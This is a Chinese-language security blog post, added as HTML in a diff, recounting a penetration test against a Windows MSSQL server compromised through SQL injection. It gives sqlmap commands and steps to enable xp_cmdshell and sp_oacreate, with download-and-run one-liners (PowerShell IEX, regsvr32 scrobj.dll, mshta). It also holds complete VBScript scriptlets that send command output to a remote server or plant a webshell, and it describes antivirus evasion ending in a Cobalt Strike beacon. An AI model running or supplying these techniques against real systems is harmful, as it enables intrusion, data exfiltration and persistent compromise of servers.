@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Regsvr32 ole对象</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h1 id="某次项目技术点实录-regsvr32-ole对象">某次项目技术点实录-Regsvr32 ole对象</h1>
+<p><strong>由于环境都无法进行演示，目前取得都是历史留存的截图</strong></p>
+<h2 id="突破口">突破口</h2>
+<p>一开始是一个外网的SQL注入，通过sqlmap正常操作，得知是DBA权限，数据库：MSSQL</p>
+<pre><code>sqlmap.py -u &quot;http://xxx.com/xxx/xxx.aspx?yum=xx&amp;xx=xx&quot; -p yhm --random-agent --cookie='ASP.NET_SessionId=xxxx'
+</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-13-57-49.png" alt=""></p>
+<p>直接通过<code>--os-shell</code>来执行命令：</p>
+<pre><code>[18:39:23] [INFO] checking if xp_cmdshell extended procedure is available, please wait..
+xp_cmdshell extended procedure does not seem to be available. Do you want sqlmap to try to re-enable it? [Y/n] Y
+[18:39:25] [WARNING] xp_cmdshell re-enabling failed
+</code></pre><h3 id="启用xp_cmdshell">启用xp_cmdshell</h3>
+<p>手动启动语句：</p>
+<pre><code>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+</code></pre><p>执行：</p>
+<pre><code>exec master..xp_cmdshell &quot;whoami&quot;
+</code></pre><h3 id="启用ole-automation">启用OLE Automation</h3>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-15-19-48.png" alt=""></p>
+<p>通过启用xp_cmdshell失败，sqlmap还会尝试<code>sp_OACreate</code>，<code>sp_OACreate</code>这个方式是不带回显的，通常利用语句如下：</p>
+<pre><code>EXEC sp_configure 'show advanced options', 1;   
+RECONFIGURE WITH OVERRIDE;   
+EXEC sp_configure 'Ole Automation Procedures', 1;
+RECONFIGURE WITH OVERRIDE;   
+EXEC sp_configure 'show advanced options', 0;
+</code></pre><p>执行：</p>
+<pre><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt'
+</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-07-02.png" alt=""></p>
+<p>通过调用<code>sp_oacreate</code>能够获得一个数字返回值，若全是0，则执行失败，必须有1。</p>
+<h2 id="判断网络环境">判断网络环境</h2>
+<p>能执行命令后，为了判断能否出网，先尝试DNS Log。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-08-54.png" alt=""></p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-09-18.png" alt=""></p>
+<p>在<code>os-shell</code>中，执行：<code>nslookup xxxxx.net</code>，burp看回显即可。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-11-13.png" alt=""></p>
+<p>DNS能出，接下来看TCP报文&hellip;</p>
+<p>这里我使用<code>certutil</code>、<code>bitsadmin</code>命令来测试，但是么有截图&hellip;</p>
+<pre><code>$ python3 -m http.server
+</code></pre><pre><code>os-shell&gt;certutil -urlcache -split -f http://xxx:8000/
+</code></pre><p>收到相应的请求后，基本上稳妥了，可以采用<code>reverse_tcp</code>的方案，用powershell反弹一个beacon到cobalt strike上。</p>
+<h2 id="regsvr32妙用">Regsvr32妙用</h2>
+<p>测试的过程中，并不顺利，后来我发现它有反病毒软件&hellip;</p>
+<p>尝试了以下方法：</p>
+<pre><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/a22'))&quot;
+
+regsvr32 /s /n /u /i:http://x.x.0.x:8080/zfgJrh6V.sct scrobj.dll
+
+mshta http://xxx.xx.xx.xx/1.hta
+</code></pre><p>然后我发现msf <code>exploit/multi/script/web_delivery</code>生成的地址，都会在底层调用一层<code>powershell</code></p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-45-14.png" alt=""></p>
+<p>目前，这种download+iex方式肯定不行了，然后我就改了几个脚本，通过HTTP Log来回显执行结果：</p>
+<p>获取进程列表：</p>
+<pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+	&lt;registration progid=&quot;d08c96&quot; classid=&quot;{cea46581-c344-4157-b891-30f358f1522d}&quot; &gt;
+		&lt;script language=&quot;vbscript&quot;&gt;
+&lt;![CDATA[
+Sub getName(name)
+  	Dim http
+	Set http = CreateObject(&quot;Msxml2.ServerXMLHTTP&quot;)
+	http.open &quot;GET&quot;,&quot;http://xxx.xxx.xxx.xxx:8086/&quot;+name, False
+	http.send
+End Sub
+
+Sub Cmd(command)
+Set oShell = CreateObject(&quot;WScript.Shell&quot;)
+Set Re = oShell.Exec(command)
+
+Do While Not Re.StdOut.AtEndOfStream
+	getName Re.StdOut.ReadLine()
+Loop
+End Sub
+
+Cmd &quot;powershell -w hidden -c $s=Get-Process;$process ='';foreach ($n in $s){$process += $n.Name+'|'}$Bytes = [System.Text.Encoding]::Unicode.GetBytes($process);$EncodedText =[Convert]::ToBase64String($Bytes);Write-Host $EncodedText;exit;&quot;
+]]&gt;
+		&lt;/script&gt;
+	&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre><p>执行：</p>
+<pre><code>wmic process call create &quot;regsvr32 /s /n /u /i:http://xxx.xxx.xxx.xxx:8086/p.txt scrobj.dll&quot;
+</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-51-18.png" alt=""></p>
+<p>获得回显。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-48-39.png" alt=""></p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-49-25.png" alt=""></p>
+<p>获得进程列表后，看到有<code>EST Nod32</code>、<code>360</code>等防护软件，看来需要做的工作有很多。</p>
+<p>列目录：</p>
+<pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+	&lt;registration progid=&quot;d08c96&quot; classid=&quot;{cea46581-c344-4157-b891-30f358f1522d}&quot; &gt;
+		&lt;script language=&quot;vbscript&quot;&gt;
+&lt;![CDATA[
+Sub getName(name)
+  	Dim http
+	Set http = CreateObject(&quot;Msxml2.ServerXMLHTTP&quot;)
+	http.open &quot;GET&quot;,&quot;http://xxx.xxx.xxx.xxx:8086/&quot;+name, False
+	http.send
+End Sub
+
+Sub Cmd(command)
+Set oShell = CreateObject(&quot;WScript.Shell&quot;)
+Set Re = oShell.Exec(command)
+
+Do While Not Re.StdOut.AtEndOfStream
+	getName Re.StdOut.ReadLine()
+Loop
+End Sub
+
+Cmd &quot;powershell -w hidden -c $s=Get-ChildItem D:\web4_new\;$process ='';foreach ($n in $s){$process += $n.Name+'|'}$Bytes = [System.Text.Encoding]::Unicode.GetBytes($process);$EncodedText =[Convert]::ToBase64String($Bytes);Write-Host $EncodedText;exit;&quot;
+]]&gt;
+		&lt;/script&gt;
+	&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre><p>下载Webshell：</p>
+<pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+	&lt;registration progid=&quot;d08c96&quot; classid=&quot;{cea46581-c344-4157-b891-30f358f1522d}&quot; &gt;
+		&lt;script language=&quot;vbscript&quot;&gt;
+		&lt;![CDATA[
+Set Shell = CreateObject(&quot;Wscript.Shell&quot;)
+Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;)
+wfolder = &quot;C:\inetpub\wwwroot\xxx\111english.aspx&quot;
+Post.Open &quot;GET&quot;,&quot;http://xxx.xxxx.xxx.xxx:85/bak/english.txt&quot;,0
+Post.Send()
+Set aGet = CreateObject(&quot;ADODB.Stream&quot;)
+aGet.Mode = 3
+aGet.Type = 1
+aGet.Open()
+aGet.Write(Post.responseBody)
+
+aGet.SaveToFile wfolder,2
+
+		]]&gt;
+		&lt;/script&gt;
+	&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre><p>通过指定不同的txt，执行不同的代码。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-53-53.png" alt=""></p>
+<p>当然，毫无疑问的最终获得了beacon：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-54-58.png" alt=""></p>
+<p>免杀环节就不记录了。</p>
+<h2 id="总结">总结</h2>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-14-59-19.png" alt=""></p>
+<p>外网多个SQL注入-SQL Server DBA，无回显，360+ESET NOD32 Antivirus，regsvr32通过一个ole对象执行VBscript，使用<code>--os-shell</code>，底层执行的父进程是一个mssql service，所以av可能不那么关注，但是通过&ndash;os-shell直接创建powershell，就会被拦截；</p>
+<p>通过加载我服务器上的sct文件，执行自定义的vbs之外，我发现它不会阻止vbs派生powershell；</p>
+<p>但是通过vbs直接派生powershell下载代码执行、或直接反弹，都被干掉。由于没有回显，无法确定我免杀的木马落地目录，只能用powershell获取目录、当前用户情况，返回base64，交给vbs，请求http log。得到服务器环境，最终确定落地目录后，基本上就可以getshell、上线等操作。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-07-19/2019-07-19-15-08-36.png" alt=""></p>
+<p>由于反病毒软件会监控xp_cmdshell，一执行就会返回<code>CreateProcess Error Code 5</code>等问题，<code>sp_oacreate</code>是能够解决，但是没有回显，可通过发送网络请求来看。</p>
+<p>sp_oacreate是基于ole对象的，ole对象执行拦截的较少、包括regsvr32也是调用的ole对象去执行vbs代码，这其中有一种白名单派生关系。</p>
+<p>语法</p>
+<pre><code>sp_OACreate progid, | clsid,
+objecttoken OUTPUT
+[ , context ]
+</code></pre><pre><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt'
+</code></pre><p>其中<code>'wscript.shell'</code>就是一个对象，这个对象可以是其他ole对象，具体还需要继续发掘。。</p>
+
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+</body>
+</html>
